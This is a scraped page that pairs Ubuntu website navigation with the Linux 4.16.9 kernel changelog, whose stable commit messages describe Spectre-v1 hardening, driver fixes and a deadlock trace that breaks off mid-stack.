* [Docs](/core/docs)

---

## [Ubuntu Desktop](/desktop) [Ubuntu Desktop](/desktop)

* [Organisations](/desktop/organisations)
* [Developers](/desktop/developers)
* [Flavours](/desktop/flavours)
* [WSL](/desktop/wsl)

---

## [Ubuntu Server](/server) [Ubuntu Server](/server)

* [Hyperscale](/server/hyperscale)
* [Docs](/server/docs)

---

## [Cloud](/cloud) [Cloud](/cloud)

* [What is cloud computing](/cloud/cloud-computing)
* [What is private cloud](/cloud/private-cloud)
* [What is hybrid cloud](/cloud/hybrid-cloud)
* [What is multi-cloud](/cloud/multi-cloud)
* [Public cloud](/cloud/public-cloud)

---

## [Security](/security) [Security](/security)

* [ESM](/security/esm)
* [Livepatch](/security/livepatch)
* [Certifications & Hardening](/security/compliance-automation)
* [CVEs](/security/cves)
* [Notices](/security/notices)
* [Docker Images](/security/docker-images)

---

## [Landscape](/landscape) [Landscape](/landscape)

* [Features](/landscape/features)
* [Managed](/landscape/managed)
* [Compare](/landscape/compare)
* [Install](/landscape/docs/quickstart-deployment)
* [Docs](/landscape/docs)
* [Log in to Landscape](https://landscape.canonical.com/)

---

## [Containers](/containers) [Containers](/containers)

* [What are containers](/containers/what-are-containers)
* [Chiseled Ubuntu](/containers/chiseled)
* [Chiseled and .NET](/containers/chiseled/dotnet)

---

## [Downloads](/download) [Downloads](/download)

* [Desktop](/download/desktop)
* [Server](/download/server)
* [Core](/download/core)
* [Cloud](/download/cloud)

---

## [Support](/support) [Support](/support)

* [Your subscriptions](/pro/dashboard)
* [Account users](/pro/users)
* [Pricing](/pricing/pro)
* [Discourse](https://discourse.ubuntu.com/c/project/ubuntu-pro/116/)

---

## [Observability](/observability) [Observability](/observability)

* [What is observability](/observability/what-is-observability)
* [Managed](/observability/managed)

---

## [Pricing](/pricing) [Pricing](/pricing)

* [Consulting](/pricing/consulting)
* [Desktops](/pricing/desktop)
* [Devices](/pricing/devices)

---

## Solutions

* [AI](https://canonical.com/solutions/ai)
* [Data](https://canonical.com/data)
* [Infrastructure](https://canonical.com/solutions/infrastructure)
* [Secure open source](https://canonical.com/solutions/secure-open-source)

---

## Sectors

* [Automotive](/automotive)
* [Industrial](/industrial)
* [Government](/gov)
* [Telco](/telco)
* [Finance](/financial-services)

---

[Contact us](/contact-us)

* [About us](/about)
* [Community](/community)
* [Careers](https://www.canonical.com/careers)
* [Blog](/blog)
* [Resources](/engage)
* [Press centre](/blog/press-centre)

---

© 2025 Canonical Ltd.

Ubuntu and Canonical are registered trademarks of Canonical Ltd.

---

* [Legal information](/legal)
* [Data privacy](/legal/data-privacy)
* Manage your tracker settings
* [Report a bug on this site](https://github.com/canonical/ubuntu.com/issues/new?template=ISSUE_TEMPLATE.yaml)

Back to top

Go to the top of the page



=== Content from www.kernel.org_fab73a6b_20250125_093055.html ===
commit 018ab995e277c547e49199171133e513a163deba
Author: Greg Kroah-Hartman
Date: Wed May 16 10:12:36 2018 +0200
Linux 4.16.9
commit 4a361fa40b39fc93bf832ffad34351c62fe8d834
Author: Peter Zijlstra
Date: Fri Apr 20 14:08:58 2018 +0200
perf/x86: Fix possible Spectre-v1 indexing for x86\_pmu::event\_map()
commit 46b1b577229a091b137831becaa0fae8690ee15a upstream.
> arch/x86/events/intel/cstate.c:307 cstate\_pmu\_event\_init() warn: potential spectre issue 'pkg\_msr' (local cap)
> arch/x86/events/intel/core.c:337 intel\_pmu\_event\_map() warn: potential spectre issue 'intel\_perfmon\_event\_map'
> arch/x86/events/intel/knc.c:122 knc\_pmu\_event\_map() warn: potential spectre issue 'knc\_perfmon\_event\_map'
> arch/x86/events/intel/p4.c:722 p4\_pmu\_event\_map() warn: potential spectre issue 'p4\_general\_events'
> arch/x86/events/intel/p6.c:116 p6\_pmu\_event\_map() warn: potential spectre issue 'p6\_perfmon\_event\_map'
> arch/x86/events/amd/core.c:132 amd\_pmu\_event\_map() warn: potential spectre issue 'amd\_perfmon\_event\_map'
Userspace controls @attr, sanitize @attr->config before passing it on
to x86\_pmu::event\_map().
Reported-by: Dan Carpenter
Signed-off-by: Peter Zijlstra (Intel)
Cc:
Cc: Alexander Shishkin
Cc: Arnaldo Carvalho de Melo
Cc: Jiri Olsa
Cc: Linus Torvalds
Cc: Peter Zijlstra
Cc: Stephane Eranian
Cc: Thomas Gleixner
Cc: Vince Weaver
Signed-off-by: Ingo Molnar
Signed-off-by: Greg Kroah-Hartman
commit 953a486c108600f9178a5df79be519db2de335f5
Author: Peter Zijlstra
Date: Fri Apr 20 14:03:18 2018 +0200
perf/core: Fix possible Spectre-v1 indexing for ->aux\_pages[]
commit 4411ec1d1993e8dbff2898390e3fed280d88e446 upstream.
> kernel/events/ring\_buffer.c:871 perf\_mmap\_to\_page() warn: potential spectre issue 'rb->aux\_pages'
Userspace controls @pgoff through the fault address. Sanitize the
array index before doing the array dereference.
Reported-by: Dan Carpenter
Signed-off-by: Peter Zijlstra (Intel)
Cc:
Cc: Alexander Shishkin
Cc: Arnaldo Carvalho de Melo
Cc: Jiri Olsa
Cc: Linus Torvalds
Cc: Peter Zijlstra
Cc: Stephane Eranian
Cc: Thomas Gleixner
Cc: Vince Weaver
Signed-off-by: Ingo Molnar
Signed-off-by: Greg Kroah-Hartman
commit 5d40cb48f65a9527ce07725ec1808abd0277fad0
Author: Peter Zijlstra
Date: Fri Apr 20 14:23:36 2018 +0200
perf/x86/msr: Fix possible Spectre-v1 indexing in the MSR driver
commit 06ce6e9b6d6c09d4129c6e24a1314a395d816c10 upstream.
> arch/x86/events/msr.c:178 msr\_event\_init() warn: potential spectre issue 'msr' (local cap)
Userspace controls @attr, sanitize cfg (attr->config) before using it
to index an array.
Reported-by: Dan Carpenter
Signed-off-by: Peter Zijlstra (Intel)
Cc:
Cc: Alexander Shishkin
Cc: Arnaldo Carvalho de Melo
Cc: Jiri Olsa
Cc: Linus Torvalds
Cc: Peter Zijlstra
Cc: Stephane Eranian
Cc: Thomas Gleixner
Cc: Vince Weaver
Signed-off-by: Ingo Molnar
Signed-off-by: Greg Kroah-Hartman
commit 419eb44fbde8e691139eb0def60d1842e0b4bc5a
Author: Peter Zijlstra
Date: Fri Apr 20 14:25:48 2018 +0200
perf/x86/cstate: Fix possible Spectre-v1 indexing for pkg\_msr
commit a5f81290ce475489fa2551c01a07470c1a4c932e upstream.
> arch/x86/events/intel/cstate.c:307 cstate\_pmu\_event\_init() warn: potential spectre issue 'pkg\_msr' (local cap)
Userspace controls @attr, sanitize cfg (attr->config) before using it
to index an array.
Reported-by: Dan Carpenter
Signed-off-by: Peter Zijlstra (Intel)
Cc:
Cc: Alexander Shishkin
Cc: Arnaldo Carvalho de Melo
Cc: Jiri Olsa
Cc: Linus Torvalds
Cc: Peter Zijlstra
Cc: Stephane Eranian
Cc: Thomas Gleixner
Cc: Vince Weaver
Signed-off-by: Ingo Molnar
Signed-off-by: Greg Kroah-Hartman
commit 1a1faf67b7e8a5b07e37a188846efeff1875d96f
Author: Peter Zijlstra
Date: Fri Apr 20 14:06:29 2018 +0200
perf/x86: Fix possible Spectre-v1 indexing for hw\_perf\_event cache\_\*
commit ef9ee4ad38445a30909c48998624861716f2a994 upstream.
> arch/x86/events/core.c:319 set\_ext\_hw\_attr() warn: potential spectre issue 'hw\_cache\_event\_ids[cache\_type]' (local cap)
> arch/x86/events/core.c:319 set\_ext\_hw\_attr() warn: potential spectre issue 'hw\_cache\_event\_ids' (local cap)
> arch/x86/events/core.c:328 set\_ext\_hw\_attr() warn: potential spectre issue 'hw\_cache\_extra\_regs[cache\_type]' (local cap)
> arch/x86/events/core.c:328 set\_ext\_hw\_attr() warn: potential spectre issue 'hw\_cache\_extra\_regs' (local cap)
Userspace controls @config which contains 3 (byte) fields used for a 3
dimensional array deref.
Reported-by: Dan Carpenter
Signed-off-by: Peter Zijlstra (Intel)
Cc:
Cc: Alexander Shishkin
Cc: Arnaldo Carvalho de Melo
Cc: Jiri Olsa
Cc: Linus Torvalds
Cc: Peter Zijlstra
Cc: Stephane Eranian
Cc: Thomas Gleixner
Cc: Vince Weaver
Signed-off-by: Ingo Molnar
Signed-off-by: Greg Kroah-Hartman
commit 500a846cd788e925aad4f2c5b0a54c678a9105ce
Author: Masami Hiramatsu
Date: Tue Apr 10 21:20:08 2018 +0900
tracing/uprobe\_event: Fix strncpy corner case
commit 50268a3d266ecfdd6c5873d62b2758d9732fc598 upstream.
Fix string fetch function to terminate with NUL.
It is OK to drop the rest of string.
Signed-off-by: Masami Hiramatsu
Cc: Linus Torvalds
Cc: Peter Zijlstra
Cc: Song Liu
Cc: Thomas Gleixner
Cc: security@kernel.org
Cc: 范龙飞
Fixes: 5baaa59ef09e ("tracing/probes: Implement 'memory' fetch method for uprobes")
Signed-off-by: Ingo Molnar
Signed-off-by: Greg Kroah-Hartman
commit 8577c7a3191dd08b9e5a246630cdd628f248a94f
Author: Peter Zijlstra
Date: Fri Apr 20 15:03:45 2018 +0200
sched/autogroup: Fix possible Spectre-v1 indexing for sched\_prio\_to\_weight[]
commit 354d7793070611b4df5a79fbb0f12752d0ed0cc5 upstream.
> kernel/sched/autogroup.c:230 proc\_sched\_autogroup\_set\_nice() warn: potential spectre issue 'sched\_prio\_to\_weight'
Userspace controls @nice, sanitize the array index.
Reported-by: Dan Carpenter
Signed-off-by: Peter Zijlstra (Intel)
Cc: Linus Torvalds
Cc: Peter Zijlstra
Cc: Thomas Gleixner
Cc:
Signed-off-by: Ingo Molnar
Signed-off-by: Greg Kroah-Hartman
commit 5d728a4ecab107668f241c6d2a10cc9380830c25
Author: Peter Zijlstra
Date: Fri Apr 20 14:29:51 2018 +0200
sched/core: Fix possible Spectre-v1 indexing for sched\_prio\_to\_weight[]
commit 7281c8dec8a87685cb54d503d8cceef5a0fc2fdd upstream.
> kernel/sched/core.c:6921 cpu\_weight\_nice\_write\_s64() warn: potential spectre issue 'sched\_prio\_to\_weight'
Userspace controls @nice, so sanitize the value before using it to
index an array.
Reported-by: Dan Carpenter
Signed-off-by: Peter Zijlstra (Intel)
Cc:
Cc: Linus Torvalds
Cc: Mike Galbraith
Cc: Peter Zijlstra
Cc: Thomas Gleixner
Cc: linux-kernel@vger.kernel.org
Signed-off-by: Ingo Molnar
Signed-off-by: Greg Kroah-Hartman
commit 62e16d89b4cf9b64436c33c6383df321eca91bec
Author: Jean Delvare
Date: Sat May 12 11:57:37 2018 +0200
swiotlb: silent unwanted warning "buffer is full"
commit 05e13bb57e6f181d7605f8608181c7e6fb7f591d upstream.
If DMA\_ATTR\_NO\_WARN is passed to swiotlb\_alloc\_buffer(), it should be
passed further down to swiotlb\_tbl\_map\_single(). Otherwise we escape
half of the warnings but still log the other half.
This is one of the multiple causes of spurious warnings reported at:
https://bugs.freedesktop.org/show\_bug.cgi?id=104082
Signed-off-by: Jean Delvare
Fixes: 0176adb00406 ("swiotlb: refactor coherent buffer allocation")
Cc: Christoph Hellwig
Cc: Christian König
Cc: Michel Dänzer
Cc: Takashi Iwai
Cc: stable@vger.kernel.org # v4.16
Signed-off-by: Greg Kroah-Hartman
commit 940f0fab9d9e3417acc1d035d79bd5b8b4c15454
Author: Steve French
Date: Thu May 10 10:59:37 2018 -0500
smb3: directory sync should not return an error
commit 6e70c267e68d77679534dcf4aaf84e66f2cf1425 upstream.
As with NFS, which ignores sync on directory handles,
fsync on a directory handle is a noop for CIFS/SMB3.
Do not return an error on it. It breaks some database
apps otherwise.
Signed-off-by: Steve French
CC: Stable
Reviewed-by: Ronnie Sahlberg
Reviewed-by: Pavel Shilovsky
Signed-off-by: Greg Kroah-Hartman
commit 4dc9278eb7022011e55e7e876efdbaef790eafcd
Author: Charles Machalow
Date: Thu May 10 16:01:38 2018 -0700
nvme: Fix sync controller reset return
commit 4e50d9ebaeaa3c6761d2b513ef7039510c8cf213 upstream.
If a controller reset is requested while the device has no namespaces,
we were incorrectly returning ENETRESET. This patch adds the check for
ADMIN\_ONLY controller state to indicate a successful reset.
Fixes: 8000d1fdb0 ("nvme-rdma: fix sysfs invoked reset\_ctrl error flow ")
Cc:
Signed-off-by: Charles Machalow
[changelog]
Signed-off-by: Keith Busch
Signed-off-by: Greg Kroah-Hartman
commit 4af6b3c49a745e2587abaff1b2fa39109e2ee288
Author: Jens Axboe
Date: Tue May 8 10:25:15 2018 -0600
nvme: add quirk to force medium priority for SQ creation
commit 9abd68ef454c824bfd18629033367b4382b5f390 upstream.
Some P3100 drives have a bug where they think WRRU (weighted round robin)
is always enabled, even though the host doesn't set it. Since they think
it's enabled, they also look at the submission queue creation priority. We
used to set that to MEDIUM by default, but that was removed in commit
81c1cd98351b. This causes various issues on that drive. Add a quirk to
still set MEDIUM priority for that controller.
Fixes: 81c1cd98351b ("nvme/pci: Don't set reserved SQ create flags")
Cc: stable@vger.kernel.org
Signed-off-by: Jens Axboe
Signed-off-by: Keith Busch
Signed-off-by: Greg Kroah-Hartman
commit 66832455217f187edcb1184c7a31bcd860f4e185
Author: Marek Szyprowski
Date: Mon Apr 16 12:11:53 2018 +0200
thermal: exynos: Propagate error value from tmu\_read()
commit c8da6cdef57b459ac0fd5d9d348f8460a575ae90 upstream.
tmu\_read() in case of Exynos4210 might return error for out of bound
values. Current code ignores such value, what leads to reporting critical
temperature value. Add proper error code propagation to exynos\_get\_temp()
function.
Signed-off-by: Marek Szyprowski
CC: stable@vger.kernel.org # v4.6+
Signed-off-by: Bartlomiej Zolnierkiewicz
Signed-off-by: Eduardo Valentin
Signed-off-by: Greg Kroah-Hartman
commit b0f8fc1ff5f3ecc9c445a89049c3215a73bac379
Author: Marek Szyprowski
Date: Mon Apr 16 12:11:52 2018 +0200
thermal: exynos: Reading temperature makes sense only when TMU is turned on
commit 88fc6f73fddf64eb507b04f7b2bd01d7291db514 upstream.
When thermal sensor is not yet enabled, reading temperature might return
random value. This might even result in stopping system booting when such
temperature is higher than the critical value. Fix this by checking if TMU
has been actually enabled before reading the temperature.
This change fixes booting of Exynos4210-based board with TMU enabled (for
example Samsung Trats board), which was broken since v4.4 kernel release.
Signed-off-by: Marek Szyprowski
Fixes: 9e4249b40340 ("thermal: exynos: Fix first temperature read after registering sensor")
CC: stable@vger.kernel.org # v4.6+
Signed-off-by: Bartlomiej Zolnierkiewicz
Signed-off-by: Eduardo Valentin
Signed-off-by: Greg Kroah-Hartman
commit 1e8af7930534d2601d5509c2d09d82ee931c7c8a
Author: Hans de Goede
Date: Fri Apr 27 11:26:43 2018 +0200
Bluetooth: btusb: Only check needs\_reset\_resume DMI table for QCA rome chipsets
commit fc54910280eb38bde923cdf0898e74687d8e6989 upstream.
Jeremy Cline correctly points out in rhbz#1514836 that a device where the
QCA rome chipset needs the USB\_QUIRK\_RESET\_RESUME quirk, may also ship
with a different wifi/bt chipset in some configurations.
If that is the case then we are needlessly penalizing those other chipsets
with a reset-resume quirk, typically causing 0.4W extra power use because
this disables runtime-pm.
This commit moves the DMI table check to a btusb\_check\_needs\_reset\_resume()
helper (so that we can easily also call it for other chipsets) and calls
this new helper only for QCA\_ROME chipsets for now.
BugLink: https://bugzilla.redhat.com/show\_bug.cgi?id=1514836
Cc: stable@vger.kernel.org
Cc: Jeremy Cline
Suggested-by: Jeremy Cline
Signed-off-by: Hans de Goede
Signed-off-by: Marcel Holtmann
Signed-off-by: Greg Kroah-Hartman
commit 6350ed0be4e046cf91e61ed67ec8c34e59239f09
Author: Hans de Goede
Date: Thu Apr 26 20:52:06 2018 +0200
Bluetooth: btusb: Add Dell XPS 13 9360 to btusb\_needs\_reset\_resume\_table
commit 596b07a9a22656493726edf1739569102bd3e136 upstream.
The Dell XPS 13 9360 uses a QCA Rome chip which needs to be reset
(and have its firmware reloaded) for bluetooth to work after
suspend/resume.
BugLink: https://bugzilla.redhat.com/show\_bug.cgi?id=1514836
Cc: stable@vger.kernel.org
Cc: Garrett LeSage
Reported-and-tested-by: Garrett LeSage
Signed-off-by: Hans de Goede
Signed-off-by: Marcel Holtmann
Signed-off-by: Greg Kroah-Hartman
commit 0c20458849c6215eda48ff68d4474104dd52d6bf
Author: Hans de Goede
Date: Thu Apr 26 14:18:19 2018 +0200
Revert "Bluetooth: btusb: Fix quirk for Atheros 1525/QCA6174"
commit 544a591668813583021474fa5c7ff4942244d654 upstream.
Commit f44cb4b19ed4 ("Bluetooth: btusb: Fix quirk for Atheros
1525/QCA6174") is causing bluetooth to no longer work for several
people, see: https://bugzilla.redhat.com/show\_bug.cgi?id=1568911
So lets revert it for now and try to find another solution for
devices which need the modified quirk.
Cc: stable@vger.kernel.org
Cc: Takashi Iwai
Signed-off-by: Hans de Goede
Signed-off-by: Marcel Holtmann
Signed-off-by: Greg Kroah-Hartman
commit 93afa266fcdf0a5254381c5bc149eaea14adcd67
Author: Uwe Kleine-König
Date: Wed Apr 25 16:50:40 2018 +0200
arm: dts: imx[35]\*: declare flexcan devices to be compatible to imx25's flexcan
commit 9a62dcf486c10daf5366f29df1c799f69b1510f9 upstream.
Commit d50f4630c2e1 ("arm: dts: Remove p1010-flexcan compatible from imx
series dts") removed the fallback compatible "fsl,p1010-flexcan" from
the imx device trees. As the flexcan cores on i.MX25, i.MX35 and i.MX53
are identical, introduce the first as fallback for the two latter ones.
Fixes: d50f4630c2e1 ("arm: dts: Remove p1010-flexcan compatible from imx series dts")
Signed-off-by: Uwe Kleine-König
Cc: linux-stable  # >= v4.16
Signed-off-by: Marc Kleine-Budde
Signed-off-by: Greg Kroah-Hartman
commit e775e2787269cfcdd89b8f78f0e37ba8013ba9c3
Author: Rafael J. Wysocki
Date: Wed May 9 11:44:56 2018 +0200
cpufreq: schedutil: Avoid using invalid next\_freq
commit 97739501f207efe33145b918817f305b822987f8 upstream.
If the next\_freq field of struct sugov\_policy is set to UINT\_MAX,
it shouldn't be used for updating the CPU frequency (this is a
special "invalid" value), but after commit b7eaf1aab9f8 (cpufreq:
schedutil: Avoid reducing frequency of busy CPUs prematurely) it
may be passed as the new frequency to sugov\_update\_commit() in
sugov\_update\_single().
Fix that by adding an extra check for the special UINT\_MAX value
of next\_freq to sugov\_update\_single().
Fixes: b7eaf1aab9f8 (cpufreq: schedutil: Avoid reducing frequency of busy CPUs prematurely)
Reported-by: Viresh Kumar
Cc: 4.12+  # 4.12+
Signed-off-by: Rafael J. Wysocki
Acked-by: Viresh Kumar
Signed-off-by: Rafael J. Wysocki
Signed-off-by: Greg Kroah-Hartman
commit c3c4529e82f6e1c10b442263343487ef5add12c7
Author: Rafael J. Wysocki
Date: Wed May 9 00:18:32 2018 +0200
PCI / PM: Check device\_may\_wakeup() in pci\_enable\_wake()
commit cfcadfaad7251d8b640713724b388164d75465b2 upstream.
Commit 0847684cfc5f0 (PCI / PM: Simplify device wakeup settings code)
went too far and dropped the device\_may\_wakeup() check from
pci\_enable\_wake() which causes wakeup to be enabled during system
suspend, hibernation or shutdown for some PCI devices that are not
allowed by user space to wake up the system from sleep (or power off).
As a result of this, excessive power is drawn by some of the affected
systems while in sleep states or off.
Restore the device\_may\_wakeup() check in pci\_enable\_wake(), but make
sure that the PCI bus type's runtime suspend callback will not call
device\_may\_wakeup() which is about system wakeup from sleep and not
about device wakeup from runtime suspend.
Fixes: 0847684cfc5f0 (PCI / PM: Simplify device wakeup settings code)
Reported-by: Joseph Salisbury
Cc: 4.13+  # 4.13+
Signed-off-by: Rafael J. Wysocki
Acked-by: Bjorn Helgaas
Signed-off-by: Greg Kroah-Hartman
commit b9a1108e2fb8de517c704dedc88a2d7c45910f87
Author: Kai Heng Feng
Date: Mon May 7 14:11:20 2018 +0800
PCI / PM: Always check PME wakeup capability for runtime wakeup support
commit 8feaec33b9868582654cd3d5355225dcb79aeca6 upstream.
USB controller ASM1042 stops working after commit de3ef1eb1cd0 (PM /
core: Drop run\_wake flag from struct dev\_pm\_info).
The device in question is not power managed by platform firmware,
furthermore, it only supports PME# from D3cold:
Capabilities: [78] Power Management version 3
Flags: PMEClk- DSI- D1- D2- AuxCurrent=55mA PME(D0-,D1-,D2-,D3hot-,D3cold+)
Status: D0 NoSoftRst+ PME-Enable- DSel=0 DScale=0 PME-
Before commit de3ef1eb1cd0, the device never gets runtime suspended.
After that commit, the device gets runtime suspended to D3hot, which can
not generate any PME#.
usb\_hcd\_pci\_probe() unconditionally calls device\_wakeup\_enable(), hence
device\_can\_wakeup() in pci\_dev\_run\_wake() always returns true.
So pci\_dev\_run\_wake() needs to check PME wakeup capability as its first
condition.
In addition, change wakeup flag passed to pci\_target\_state() from false
to true, because we want to find the deepest state different from D3cold
that the device can still generate PME#. In this case, it's D0 for the
device in question.
Fixes: de3ef1eb1cd0 (PM / core: Drop run\_wake flag from struct dev\_pm\_info)
Signed-off-by: Kai-Heng Feng
Cc: 4.13+  # 4.13+
Acked-by: Bjorn Helgaas
Signed-off-by: Rafael J. Wysocki
Signed-off-by: Greg Kroah-Hartman
commit cc6501ddccad4d0124adffbcb2a219e461ff9abf
Author: Gustavo A. R. Silva
Date: Thu May 3 13:17:12 2018 -0500
atm: zatm: Fix potential Spectre v1
commit 2be147f7459db5bbf292e0a6f135037b55e20b39 upstream.
pool can be indirectly controlled by user-space, hence leading to
a potential exploitation of the Spectre variant 1 vulnerability.
This issue was detected with the help of Smatch:
drivers/atm/zatm.c:1462 zatm\_ioctl() warn: potential spectre issue
'zatm\_dev->pool\_info' (local cap)
Fix this by sanitizing pool before using it to index
zatm\_dev->pool\_info
Notice that given that speculation windows are large, the policy is
to kill the speculation on the first load and not worry if it can be
completed with a dependent load/store [1].
[1] https://marc.info/?l=linux-kernel&m=152449131114778&w=2
Cc: stable@vger.kernel.org
Signed-off-by: Gustavo A. R. Silva
Signed-off-by: David S. Miller
Signed-off-by: Greg Kroah-Hartman
commit 25c859f9b04d64a7d58c374243bc6fffc7bd3d9d
Author: Gustavo A. R. Silva
Date: Thu May 3 13:45:58 2018 -0500
net: atm: Fix potential Spectre v1
commit acf784bd0ce257fe43da7ca266f7a10b837479d2 upstream.
ioc\_data.dev\_num can be controlled by user-space, hence leading to
a potential exploitation of the Spectre variant 1 vulnerability.
This issue was detected with the help of Smatch:
net/atm/lec.c:702 lec\_vcc\_attach() warn: potential spectre issue
'dev\_lec'
Fix this by sanitizing ioc\_data.dev\_num before using it to index
dev\_lec. Also, notice that there is another instance in which array
dev\_lec is being indexed using ioc\_data.dev\_num at line 705:
lec\_vcc\_added(netdev\_priv(dev\_lec[ioc\_data.dev\_num]),
Notice that given that speculation windows are large, the policy is
to kill the speculation on the first load and not worry if it can be
completed with a dependent load/store [1].
[1] https://marc.info/?l=linux-kernel&m=152449131114778&w=2
Cc: stable@vger.kernel.org
Signed-off-by: Gustavo A. R. Silva
Signed-off-by: David S. Miller
Signed-off-by: Greg Kroah-Hartman
commit 4209b7ac47823c83dd8ba646691731f9377a82b5
Author: Ville Syrjälä
Date: Wed May 2 21:32:47 2018 +0300
drm/atomic: Clean private obj old\_state/new\_state in drm\_atomic\_state\_default\_clear()
commit b5cb2e5a1f64d882a155add7522247ab0523051e upstream.
Clear the old\_state and new\_state pointers for private objects
in drm\_atomic\_state\_default\_clear(). We don't actually have
functions to get the new/old state for private objects so
getting access to the potentially stale pointers requires a
bit more manual labour than for other object types. But let's
clear the pointers for private objects as well, if only to
avoid future surprises when someone decides to add the functions
to get at them.
v2: Split private objs to a separate patch (Daniel)
Cc:  # v4.14+
Cc: Maarten Lankhorst
Cc: Laurent Pinchart
Cc: Abhay Kumar
Fixes: a4370c777406 (drm/atomic: Make private objs proper objects)
Signed-off-by: Ville Syrjälä
Link: https://patchwork.freedesktop.org/patch/msgid/20180502183247.5746-1-ville.syrjala@linux.intel.com
Reviewed-by: Maarten Lankhorst
Reviewed-by: Daniel Vetter
Signed-off-by: Sean Paul
Signed-off-by: Greg Kroah-Hartman
commit 21f49229963389ec6f28dbe5d381a47d4170a658
Author: Ville Syrjälä
Date: Wed May 2 21:32:47 2018 +0300
drm/atomic: Clean old\_state/new\_state in drm\_atomic\_state\_default\_clear()
commit f0b408eebc993310bea3f2daae286c40bd3f063b upstream.
Clear the old\_state and new\_state pointers for every object in
drm\_atomic\_state\_default\_clear(). Otherwise
drm\_atomic\_get\_{new,old}\_\*\_state() will hand out stale pointers to
anyone who hasn't first confirmed that the object is in fact part of
the current atomic transcation, if they are called after we've done
the ww backoff dance while hanging on to the same drm\_atomic\_state.
For example, handle\_conflicting\_encoders() looks like it could hit
this since it iterates the full connector list and just calls
drm\_atomic\_get\_new\_connector\_state() for each.
And I believe we have now witnessed this happening at least once in
i915 check\_digital\_port\_conflicts(). Commit 8b69449d2663 ("drm/i915:
Remove last references to drm\_atomic\_get\_existing\* macros") changed
the safe drm\_atomic\_get\_existing\_connector\_state() to the unsafe
drm\_atomic\_get\_new\_connector\_state(), which opened the doors for
this particular bug there as well.
v2: Split private objs out to a separate patch (Daniel)
Cc: stable@vger.kernel.org
Cc: Maarten Lankhorst
Cc: Laurent Pinchart
Cc: Abhay Kumar
Fixes: 581e49fe6b41 ("drm/atomic: Add new iterators over all state, v3.")
Signed-off-by: Ville Syrjälä
Link: https://patchwork.freedesktop.org/patch/msgid/20180502183247.5746-1-ville.syrjala@linux.intel.com
Reviewed-by: Maarten Lankhorst
Reviewed-by: Daniel Vetter
Signed-off-by: Sean Paul
Signed-off-by: Greg Kroah-Hartman
commit 4d1a7b103fc497961b51bc589b426b968f2b1981
Author: Ben Skeggs
Date: Tue May 8 20:39:47 2018 +1000
drm/nouveau/ttm: don't dereference nvbo::cli, it can outlive client
commit 0d5a03c3d9254813ca76d7886ff9ed76a0aea545 upstream.
Potentially responsible for some random OOPSes.
Signed-off-by: Ben Skeggs
Cc: stable@vger.kernel.org [v4.15+]
Signed-off-by: Greg Kroah-Hartman
commit e4c34cdf29f09929caea3f927d52c816f098dd7d
Author: Lyude Paul
Date: Wed May 2 19:38:48 2018 -0400
drm/nouveau: Fix deadlock in nv50\_mstm\_register\_connector()
commit 352672db857290ab5b0e2b6a99c414f92bee024c upstream.
Currently; we're grabbing all of the modesetting locks before adding MST
connectors to fbdev. This isn't actually necessary, and causes a
deadlock as well:
======================================================
WARNING: possible circular locking dependency detected
4.17.0-rc3Lyude-Test+ #1 Tainted: G O
------------------------------------------------------
kworker/1:0/18 is trying to acquire lock:
00000000c832f62d (&helper->lock){+.+.}, at: drm\_fb\_helper\_add\_one\_connector+0x2a/0x60 [drm\_kms\_helper]
but task is already holding lock:
00000000942e28e2 (crtc\_ww\_class\_mutex){+.+.}, at: drm\_modeset\_backoff+0x8e/0x1c0 [drm]
which lock already depends on the new lock.
the existing dependency chain (in reverse order) is:
-> #3 (crtc\_ww\_class\_mutex){+.+.}:
ww\_mutex\_lock+0x43/0x80
drm\_modeset\_lock+0x71/0x130 [drm]
drm\_helper\_probe\_single\_connector\_modes+0x7d/0x6b0 [drm\_kms\_helper]
drm\_setup\_crtcs+0x15e/0xc90 [drm\_kms\_helper]
\_\_drm\_fb\_helper\_initial\_config\_and\_unlock+0x29/0x480 [drm\_kms\_helper]
nouveau\_fbcon\_init+0x138/0x1a0 [nouveau]
nouveau\_drm\_load+0x173/0x7e0 [nouveau]
drm\_dev\_register+0x134/0x1c0 [drm]
drm\_get\_pci\_dev+0x8e/0x160 [drm]
nouveau\_drm\_probe+0x1a9/0x230 [nouveau]
pci\_device\_probe+0xcd/0x150
driver\_probe\_device+0x30b/0x480
\_\_driver\_attach+0xbc/0xe0
bus\_for\_each\_dev+0x67/0x90
bus\_add\_driver+0x164/0x260
driver\_register+0x57/0xc0
do\_one\_initcall+0x4d/0x323
do\_init\_module+0x5b/0x1f8
load\_module+0x20e5/0x2ac0
\_\_do\_sys\_finit\_module+0xb7/0xd0
do\_syscall\_64+0x60/0x1b0
entry\_SYSCALL\_64\_after\_hwframe+0x49/0xbe
-> #2 (crtc\_ww\_class\_acquire){+.+.}:
drm\_helper\_probe\_single\_connector\_modes+0x58/0x6b0 [drm\_kms\_helper]
drm\_setup\_crtcs+0x15e/0xc90 [drm\_kms\_helper]
\_\_drm\_fb\_helper\_initial\_config\_and\_unlock+0x29/0x480 [drm\_kms\_helper]
nouveau\_fbcon\_init+0x138/0x1a0 [nouveau]
nouveau\_drm\_load+0x173/0x7e0 [nouveau]
drm\_dev\_register+0x134/0x1c0 [drm]
drm\_get\_pci\_dev+0x8e/0x160 [drm]
nouveau\_drm\_probe+0x1a9/0x230 [nouveau]
pci\_device\_probe+0xcd/0x150
driver\_probe\_device+0x30b/0x480
\_\_driver\_attach+0xbc/0xe0
bus\_for\_each\_dev+0x67/0x90
bus\_add\_driver+0x164/0x260
driver\_register+0x57/0xc0
do\_one\_initcall+0x4d/0x323
do\_init\_module+0x5b/0x1f8
load\_module+0x20e5/0x2ac0
\_\_do\_sys\_finit\_module+0xb7/0xd0
do\_syscall\_64+0x60/0x1b0
entry\_SYSCALL\_64\_after\_hwframe+0x49/0xbe
-> #1 (&dev->mode\_config.mutex){+.+.}:
drm\_setup\_crtcs+0x10c/0xc90 [drm\_kms\_helper]
\_\_drm\_fb\_helper\_initial\_config\_and\_unlock+0x29/0x480 [drm\_kms\_helper]
nouveau\_fbcon\_init+0x138/0x1a0 [nouveau]
nouveau\_drm\_load+0x173/0x7e0 [nouveau]
drm\_dev\_register+0x134/0x1c0 [drm]
drm\_get\_pci\_dev+0x8e/0x160 [drm]
nouveau\_drm\_probe+0x1a9/0x230 [nouveau]
pci\_device\_probe+0xcd/0x150
driver\_probe\_device+0x30b/0x480
\_\_driver\_attach+0xbc/0xe0
bus\_for\_each\_dev+0x67/0x90
bus\_add\_driver+0x164/0x260
driver\_register+0x57/0xc0
do\_one\_initcall+0x4d/0x323
do\_init\_module+0x5b/0x1f8
load\_module+0x20e5/0x2ac0
\_\_do\_sys\_finit\_module+0xb7/0xd0
